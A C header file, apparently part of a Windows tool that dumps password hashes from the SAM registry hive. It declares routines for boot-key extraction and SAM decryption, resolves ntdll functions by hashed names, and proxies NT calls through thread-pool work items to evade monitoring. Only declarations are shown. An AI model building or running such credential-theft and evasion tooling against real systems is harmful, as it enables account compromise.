#pragma once

#include <windef.h>
#include <ntdef.h>

#include "ntdll.h"

// https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits
#define MAX_KEY_LENGTH 255+2
#define MAX_KEY_VALUE_LENGTH 1000
#define MAX_VALUE_NAME 16383+2
#define MAX_SAM_ENTRIES 100
#define STR_TO_KEY_LEN 8

#define PROXY_NT_CALLS	1

#define NtOpenKey_RFDT   0xB9491C52
#define NtQueryKey_RFDT          0x3C34AAD6
#define NtEnumerateKey_RFDT      0x8E67DF26
#define NtQueryValueKey_RFDT     0x59F4E4D3
#define NtEnumerateValueKey_RFDT         0x0AE54B23
#define NtClose_RFDT     0x67741D8D
#define TpAllocWork_RFDT         0x4F054787
#define TpPostWork_RFDT          0xE91D6BE2
#define TpReleaseWork_RFDT       0x50595ADD
#define RtlInitUnicodeString_RFDT        0xB1AFABD9
#define ntdlldll_RFDT    0x8C6C8F3D

typedef FARPROC(WINAPI* myMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);

typedef NTSTATUS(WINAPI* myNtOpenKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(WINAPI* myNtQueryKey)(HANDLE, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* myNtEnumerateKey)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* myNtQueryValueKey)(HANDLE, PUNICODE_STRING, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* myNtEnumerateValueKey)(HANDLE, ULONG, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* myNtClose)(HANDLE);

typedef VOID(WINAPI* myRtlInitUnicodeString)(PUNICODE_STRING, __drv_aliasesMem PCWSTR);


typedef struct _sam {
	WCHAR rid[MAX_KEY_LENGTH];
	BYTE v[MAX_KEY_VALUE_LENGTH];
	ULONG vLen;
	BYTE f[MAX_KEY_VALUE_LENGTH];
	ULONG fLen;
	WCHAR classes[MAX_KEY_VALUE_LENGTH];
} *PSAM, SAM;

FARPROC myGetProcAddress(DWORD moduleName, DWORD exportName);
void getSAM(PSAM samRegEntries[], PULONG size);
void getClasses(PSAM samRegEntry);
void getBootKey(PSAM samRegEntry, PBYTE bootKeyRet);
void strToKey(PBYTE s, PBYTE keyRet);
void decryptSAM(PSAM samRegEntries[], int entries);
void getDESStr1(PSAM samRegEntry, PBYTE desStr1Ret);
void getDESStr2(PSAM samRegEntry, PBYTE desStr2Ret);
void getAuxSyskey(PSAM samRegEntry, PBYTE auxSyskeyRet);
void toUpperStr(char* s);
DWORD HashString2A(LPCSTR String);